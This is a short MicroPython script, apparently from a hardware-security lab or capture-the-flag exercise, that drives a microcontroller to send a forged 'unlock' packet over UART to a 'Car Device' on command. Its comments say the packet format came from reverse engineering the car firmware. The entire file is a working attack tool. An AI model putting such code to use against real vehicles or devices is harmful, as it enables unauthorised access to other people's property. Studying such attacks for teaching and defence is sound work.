from machine import Pin, UART
from time import sleep

# Initialize LED
led = Pin(25, Pin.OUT)

# Initialize UART 1 to communicate with Car Device
uart = UART(1, baudrate=115200, tx=Pin(4), rx=Pin(9))
uart.init(bits=8,parity=None,stop=1)

while True:
    
    # Wait for run command from host
    command = input('cmd> ').strip()
    
    # Attack car on command "run"
    if command == "run":        
        # Turn on LED
        led.toggle()
        
        # Create evil unlock message
        # Using format and password discovered by
        # Reverse Engineering the car firmware
        message = b'unlock'
        message_packet = bytes([0x56, len(message)])+message
        
        # Send evil unlock message to car device
        print('sending unlock message packet:', message_packet)
        uart.write(message_packet)
        
        # Read and display response from car device
        sleep(0.5)
        if uart.any():
            print('received response:')
            print(uart.read())

        # Turn off LED
        led.toggle()
    
    # Flush the UART FIFO on command "flush"
    elif command == "flush":
        # Clear the UART fifo, printing contents
        while uart.any():
            print('Flushing:')
            print(uart.read())
    
    else:
        print("Command not recognized:", command)


